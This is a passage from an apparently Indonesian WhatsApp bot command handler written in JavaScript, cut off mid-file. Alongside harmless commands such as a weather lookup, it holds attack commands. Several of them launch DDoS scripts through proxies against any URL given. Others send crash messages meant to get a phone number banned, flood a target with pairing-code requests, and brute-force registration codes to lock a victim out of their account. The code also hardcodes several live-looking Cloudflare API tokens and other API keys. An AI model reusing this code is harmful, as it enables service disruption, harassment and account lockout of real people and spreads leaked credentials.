          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break


      case '/tcp': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/tcp.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break


      case '/livex': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/livex.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break

      case '/xweb': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/xweb.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break

      case '/bannum': {
        if (!isDeveloper) return replygw(ownerprem)
        if (!q) return replygw(`Penggunaan .${command} 628xxx`)
        let pepec = q.replace(/[^0-9]/g, "")
        if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
        let Pe = pepec + '@s.whatsapp.net'
        await m.reply(`*_Succes Banned ${Pe}_*`)
        await bugnew3(Pe, quotedbugs)
        await bugnew2(Pe, quotedbugs)
        for (let j = 0; j < 5; j++) {
          await qio.sendMessage(Pe, { text: `${buttonqio}` }, { quoted: m })
        }
        await m.reply(`*Periksa Target kalau Sidah c1 berarti keban , kalau belum berarti bukan no fresh , dan dilahkan cari target lainnya ;)*`)
      }
        break


      case "/test": {
        m.reply(`dah on nie :)`)
      }
        break

      case '/enc': {
        if (!isPrem) return replygw(ownerprem)
        if (!q) return m.reply(`Contoh ${prefix + command} const adrian = require('adrian-api')`)
        let meg = await obfus(q)
        m.reply(`${meg.result}`)
      }
        break



      case '/cuaca':
        if (!q) throw `_Contoh_\n${prefix + command} palembang`
        let api_cuaca = '18d044eb8e1c06eaf7c5a27bb138694c'
        let unit_cuaca = 'metric'
        let nama_kota = q
        let cuaca = await fetchJson(`http://api.openweathermap.org/data/2.5/weather?q=${nama_kota}&units=${unit_cuaca}&appid=${api_cuaca}`)
        let text_cuaca = `*INFO CUACA*

*Nama:* ${cuaca.name + "," + cuaca.sys.country}
*Longitude:* ${cuaca.coord.lon}
*Latitude:* ${cuaca.coord.lat}
*Suhu:* ${cuaca.main.temp + " C"}
*Angin:* ${cuaca.wind.speed + " m/s"}
*Kelembaban:* ${cuaca.main.humidity + "%"}
*Cuaca:* ${cuaca.weather[0].main}
*Keterangan:* ${cuaca.weather[0].description}
*Udara:* ${cuaca.main.pressure + " HPa"}`
        m.reply(text_cuaca)
        break

      case '/myip':
      case '/ipbot':
        if (!isPrem) return replygw(ownerprem)
        var http = require('http')
        http.get({
          'host': 'api.ipify.org',
          'port': 80,
          'path': '/'
        }, function (resp) {
          resp.on('data', function (ip) {
            m.reply("🔎 My public IP address is: " + ip);
          })
        })
        break
      case '/deleteip':
        if (!isDeveloper) return m.reply('_Maaf, Command Ini Khusus Developer Bot Whatsap_*');

        if (args.length !== 1) {
          return m.reply('Format penggunaan salah. Contoh: !deleteip <ip>');
        }

        const ipToDelete = args[0];

        const deleteUrl = 'https://cekilhost.net/api/rizdel';

        require('axios').post(deleteUrl, `ip=${ipToDelete}`)
          .then(response => {
            if (response.data.status === 'success') {
              const successMessage = `IP ${ipToDelete} berhasil dihapus.`;
              m.reply(successMessage);
            } else {
              const errorMessage = 'Terjadi kesalahan: ' + response.data.message;
              m.reply(errorMessage);
            }
          })
          .catch(error => {
            console.error(error);
            m.reply('Terjadi kesalahan saat mengirim permintaan.');
          });
        break
      //=================================================//
      case '/listip':
        if (!isDeveloper) return m.reply('_Maaf, Command Ini Khusus Alwaysqioo*')

        const listUrl = 'https://cekilhost.net/api/awokawok';

        axios.get(listUrl)
          .then(response => {
            if (response.data.status === 'success') {
              const ipList = response.data.ips.join('\n');
              const message = `Daftar IP yang terdaftar:\n${ipList}`;
              m.reply(message);
            } else {
              const errorMessage = 'Terjadi kesalahan: ' + response.data.message;
              m.reply(errorMessage);
            }
          })
          .catch(error => {
            console.error(error);
            m.reply('Terjadi kesalahan saat mengirim permintaan.');
          });
        break
      case '/subfinder': {
        if (!isDeveloper) return m.reply('Mohon maaf, hanya pembuat yang dapat menggunakan perintah ini.')
        if (!q) return m.reply('Silakan masukkan nama domain.')
        let feta = await fetchJson(`https://api.caliph.biz.id/api/scan/subdomain?host=${q}&apikey=fZ69bJCk`);
        if (!feta.status) return m.reply(feta.message)

        let list = '*List Subdomain*\n\n'
        for (let L of feta.result) {
          list += `Name: ${L.domain}\nDNS: ${L.dns}\nProxy: ${L.cf_proxy ? "✅" : "❌"}\n\n`
        }

        qio.sendMessage(from, { text: list.trim() }, { quoted: m })
      }
        break;
      //===================Create Domain=======================//    
      case '/spampair': {
        const usePairingCode = true
        const NodeCache = require("node-cache")
        const resolveMsgBuffer = new NodeCache()
        if (!isPrem) return replygw('y lu bkn own')
        if (!q) return replygw(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx\n\nAlwaysaqioooo🐉`)
        let [peenis, pepekk = "200"] = q.split("|")
        await replygw(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
        await reaction(from, "✅")
        let target = peenis.replace(/[^0-9]/g, '').trim()
        let {
          default: makeWaSocket,
          useMultiFileAuthState,
          fetchLatestBaileysVersion
        } = require('@whiskeysockets/baileys')
        let {
          state
        } = await useMultiFileAuthState('Alwaysaqioooo')
        let {
          version
        } = await fetchLatestBaileysVersion()
        let sucked = await makeWaSocket({
          auth: state,
          browser: ['Mac Os', 'chrome', '121.0.6167.159'],
          version: [2, 2413, 1],
          keepAliveIntervalMs: 50000,
          printQRInTerminal: !usePairingCode,
          generateHighQualityLinkPreview: true,
          resolveMsgBuffer,
          logger: pino({ level: "silent" }),
          level: 'fatal'
        })
        for (let i = 0; i < pepekk; i++) {
          await sleep(2000)
          let prc = await sucked.requestPairingCode(target)
          await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
        }
        await sleep(2000)
      }
        break
      case '/tempban': {
        if (!isPrem) return replygw('y lu bkn own')
        if (args.length < 1) return replygw(`*Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819\n\nAlwaysaqioo🐉`);
        const args2 = args[0].split('|');
        if (args2.length !== 2) return replygw(`Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819\n\nAlwaysaqioo🐉`);
        const PeCountryCode = args2[0];
        const xtarget = args2[1];
        const PeNumber = xtarget.replace('@s.whatsapp.net', '');
        const Pemerge = `${PeCountryCode}${xtarget}`
        const PeMention = Pemerge + '@s.whatsapp.net';
        await replygw(`</> 𝙎𝙪𝙘𝙘𝙚𝙨️`)
        try {
          const {
            statePe,
            saveCredsPe
          } = await useMultiFileAuthState('./Alwaysaqioooo');
          const PeRequest = await Pe.requestRegistrationCode({
            phoneNumber: '+' + PeCountryCode + `${PeNumber}`,
            phoneNumberCountryCode: PeCountryCode,
            phoneNumberNationalNumber: `${PeNumber}`,
            phoneNumberMobileCountryCode: 724,
            method: 'sms'
          });
        } catch (err) { }

        for (let i = 0; i < 10000; i++) {
          try {
            var PePrefix = Math.floor(Math.random() * 999);
            var PeSuffix = Math.floor(Math.random() * 999);
            await Pe.register(`${PePrefix}-${PeSuffix}`);
          } catch (err) {
            console.log(`${PePrefix}-${PeSuffix}`);
          }
        }
      }
        break

      case '/threads': {
        if (!qtext) return replygw(`*Anda Perlu Memberikan URL Video, Postingan, Gambar Threads Apa Pun*`)
        m.reply('process bro')
        const createImage = async (url) => {
          const {
            imageMessage
          } = await generateWAMessageContent({
            image: {
              url
            }
          }, {
            upload: qio.waUploadToServer
          });
          return imageMessage;
        };
        const createVideo = async (url) => {
          const {
            videoMessage
          } = await generateWAMessageContent({
            video: {
              url
            }
          }, {
            upload: qio.waUploadToServer
          });
          return videoMessage;
        };
        let res;
        try {
          res = await fetch(`https://api.betabotz.eu.org/api/download/threads?url=${qtext}?igshid=NTc4MTIwNjQ2YQ==&apikey=TheGetsuZoZhiro`);
        } catch (error) {
          return m.reply(`Terjadi kesalahan: ${error.message}`);
        }
        let api_response = await res.json();
        if (!api_response || !api_response.result) {
          return m.reply(`Tidak Ada Video Atau Gambar Yang Ditemukan Atau Respon Dari Api Tidak Valid.`);
        }
        const imageUrls = api_response.result.image_urls;
        const videoUrls = api_response.result.video_urls;
        const mediaCards = [];
        if (videoUrls && videoUrls.length > 0) {
          for (const videoUrl of videoUrls) {
            mediaCards.push({
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: 'VIDEO',
                hasMediaAttachment: true,
                videoMessage: await createVideo(videoUrl)
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [] // Hapus semua tombol
              })
            });
          }
        }
        if (imageUrls && imageUrls.length > 0) {
          for (const imageUrl of imageUrls) {
            mediaCards.push({
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: 'IMAGE',
                hasMediaAttachment: true,
                imageMessage: await createImage(imageUrl)
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [] // Hapus semua tombol
              })
            });
          }
        }

        const msg = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                  text: `> Threads Media`
                }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: mediaCards
                })
              })
            }
          }
        }, {});

        await qio.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        });
      }
        break

      case '/iplookup': {
        if (!isCreator) return replygw('lu bkan own')
        if (!q) return replygw(`Example:\n ${prefix + command} 1.5.2.1`)
        try {
          let getjson = await fetchJson(`https://ipapi.co/${q}/json/`)
          let respon = `*Result Ip Lookup*\nCity: ${getjson.city}\nRegion: ${getjson.region}\nCountry: ${getjson.country}\nLatitude: ${getjson.latitude}\nLongitude: ${getjson.longitude}\nOrg: ${getjson.org}`
          let lok1 = `${getjson.latitude}`
          let lok2 = `${getjson.longitude}`
          m.reply(respon)
          qio.sendMessage(from, { location: { degreesLatitude: lok1, degreesLongitude: lok2, jpegThumbnail: null, "contextInfo": { "forwardingScore": 99999999, "isForwarded": true, forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: qio, serverMessageId: 2 } } } }, { quoted: m })
        } catch (err) {
          console.log(err)
          m.reply(err)
        }
      }
        break



      case 'ai': {
        if (!qtext) throw `\n *Example:*.ai ASIA`;

        try {
          let response = await fetch(`https://api.faxxcoders.xyz/api/openai?text=${qtext}`);
          let gpt = await response.json();
          await replymark(gpt.result);
        } catch (err) {
          console.error(err);
          m.reply(`Error: ${err.message}`);
        }
      };
        break

      case 'decrypty':
      case 'decode':
      case 'decorrupt':
      case 'decryp':
      case 'deobfus':
      case 'deobfuscator':
      case 'deobfuscate':
      case 'decrypti':
      case 'decrypt': {
        ya
        if (!isPrem) return replywa('lu bkan owner kocak')
        let text;
        if (args.length >= 1) {
          text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
          text = m.quoted.text;
        } else {
          return replymark(`*Example:* ${prefix + command} (Input Text Or Reply Text To Enc Code)`);
        }
        await loading()

        try {
          const message = await Decrypt(text);
          await replywa(message);

        } catch (error) {
          const errorMessage = `Terjadi kesalahan: ${error.message}`;
          await replygw(errorMessage);
        }
      }
        break


      case '/delsession': {
        if (!isCreator) return replywa('lu bukan owner bego')
        fs.readdir("./session", async function (err, files) {
          if (err) {
            console.log('Unable to scan directory: ' + err);
            return replymark('Unable to scan directory: ' + err);
          }
          let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
            item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
          )
          console.log(filteredArray.length);
          let teks = `Detected ${filteredArray.length} junk files\n\n`
          if (filteredArray.length == 0) return replymark(teks)
          filteredArray.map(function (e, i) {
            teks += (i + 1) + `. ${e}\n`
          })
          replymark(teks)
          await sleep(2000)
          replymark("Delete junk files...")
          await filteredArray.forEach(function (file) {
            fs.unlinkSync(`./session/${file}`)
          });
          await sleep(2000)
          replymark("Successfully deleted all the trash in the session folder")
        });
      }
        break
      case '/getsession':
        if (!isCreator) return replywa('lu bukan owner bego')
        replymark('Wait a moment, currently retrieving your session file')
        let sesi = await fs.readFileSync('./session/creds.json')
        qio.sendMessage(m.chat, {
          document: sesi,
          mimetype: 'application/json',
          fileName: 'creds.json'
        }, {
          quoted: m
        })
        break
      case '/shutdown':
        if (!isCreator) return replywa('lu bukan owner bego')
        replymark(`GoodbyeðŸ–`)
        await sleep(3000)
        process.exit()
        break
      case '/restart':
        if (!isCreator) return replywa('lu bukan owner bego')
        replymark('In Process....')
        exec('pm2 restart all')
        break
      case '/autoread':
        if (!isCreator) return replywa('lu bukan owner bego')
        if (args.length < 1) return replymark(`Example ${prefix + command} on/off`)
        if (q === 'on') {
          autoread = true
          replymark(`Successfully changed autoread to ${q}`)
        } else if (q === 'off') {
          autoread = false
          replymark(`Successfully changed autoread to ${q}`)
        }
        break

      case '/d1': {

        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "5d00f56aee3afd9cc4e0666bc8f23746";
            let apitoken = "mjR4BdiOo6aFO3uPl8BTgZIgOMH3asLbgVsOpEfO";
            let tld = "kedai-panel.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("PENGGUNAAN .domain1 hostname|167.29.379.23");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ZERONE OFFICIAL\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break

      case '/d2': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo OFFICIAL")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "a476ffcf9243c44a02220f184da527e8";
            let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
            let tld = "mypanell.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ZERONE OFFICIAL\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break

      case '/d3': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/6285860179127 𝘼𝙩𝙖𝙪 𝙆𝙚 𝙄𝙂 @LanzzHost")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "f374d347f22dc1b0ac208973f185c1f2";
            let apitoken = "m7Xe_0qhlv8enPURlO7UYRSR1-3C7u-uOUkZtvZa";
            let tld = "piwzstoreee.my.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break

      case '/d4': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "c1812c92fb249258e67a28573ca34344";
            let apitoken = "mqAjTHuT_GsaZsWcIjbllV-rrrtJHwyVxVeYlL1A";
            let tld = "piwzpediaaa.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break

      case '/d5': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/6283855410394")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "3cea2e71ec2bc82ea7865da5999d04b1";
            let apitoken = "eyOrW0eUPe0VxhQzzubXhY1w8X_Z120crfqpsNwL";
            let tld = "piwzpanel.me";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break

      case '/d6': {
